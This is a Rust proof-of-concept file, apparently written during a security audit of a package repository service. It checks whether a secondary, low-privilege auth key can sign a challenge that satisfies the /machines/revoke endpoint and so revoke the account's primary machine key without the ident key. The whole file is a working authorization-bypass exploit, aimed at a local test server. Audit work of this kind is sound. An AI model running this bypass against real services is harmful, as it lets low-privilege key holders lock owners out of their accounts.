// Does an AUTH-key challenge satisfy /machines/revoke, whose documented
// authority is "the ident key alone"?
use mfb_repository::crypto;
use mfb_repository::store::Store;
use std::path::{Path, PathBuf};

const URL: &str = "http://127.0.0.1:8791";

fn main() {
    let db = PathBuf::from("/tmp/repo-audit3/meta.db");
    let opened = Store::open_repository(&db, Path::new("/tmp/repo-audit3/blobs")).unwrap();
    let store = opened.store;
    let client = reqwest::blocking::Client::new();

    let name = std::env::args().nth(1).unwrap_or_else(|| "victimA".to_string());

    // Account with a primary machine key.
    let (auth1_pub, _auth1_priv) = crypto::generate_keypair();
    let (id_pub, id_priv) = crypto::generate_keypair();
    let p1 = crypto::sign(
        &_auth1_priv,
        &crypto::registration_message(crypto::ROLE_AUTH, &name, &auth1_pub),
    )
    .unwrap();
    let pi = crypto::sign(
        &id_priv,
        &crypto::registration_message(crypto::ROLE_IDENT, &name, &id_pub),
    )
    .unwrap();
    let (_owner, key1, _ik) = store
        .register_owner(&name, &auth1_pub, &p1, &id_pub, &pi)
        .unwrap();

    // A SECOND, low-privilege auth key on the same account (this is exactly what
    // `issue_publish_token` creates: a role='auth' key with a scope row).
    let (auth2_pub, auth2_priv) = crypto::generate_keypair();
    let p2 = crypto::sign(
        &auth2_priv,
        &crypto::registration_message(crypto::ROLE_AUTH, &name, &auth2_pub),
    )
    .unwrap();
    let (_o, key2) = store.add_auth_key(&name, &auth2_pub, &p2).unwrap();

    println!("primary auth fp   = {}", key1.fingerprint);
    println!("secondary auth fp = {}", key2.fingerprint);
    println!("ident private key is NEVER used below");

    // 1. Ask for an ordinary AUTH challenge for the secondary key.
    let ch: serde_json::Value = client
        .post(format!("{URL}/auth/challenge"))
        .json(&serde_json::json!({"owner": name, "authFingerprint": key2.fingerprint}))
        .send()
        .unwrap()
        .json()
        .unwrap();
    let cid = ch["challengeId"].as_str().expect("challengeId");
    let nonce = crypto::decode_bytes(ch["nonce"].as_str().unwrap(), "nonce").unwrap();

    // 2. Sign the REVOCATION message with the secondary AUTH private key.
    let sig = crypto::sign(
        &auth2_priv,
        &crypto::revocation_message(cid, &nonce, &key1.fingerprint),
    )
    .unwrap();

    // 3. Revoke the PRIMARY machine's auth key.
    let resp = client
        .post(format!("{URL}/machines/revoke"))
        .json(&serde_json::json!({
            "challengeId": cid,
            "identSignature": crypto::encode_bytes(&sig),
            "authFingerprint": key1.fingerprint,
        }))
        .send()
        .unwrap();
    println!("revoke status = {}", resp.status());
    println!("revoke body   = {}", resp.text().unwrap());

    println!(
        "primary key still usable for login? {:?}",
        store
            .owner_auth_key_by_fingerprint(&name, &key1.fingerprint)
            .unwrap()
            .is_some()
    );
}
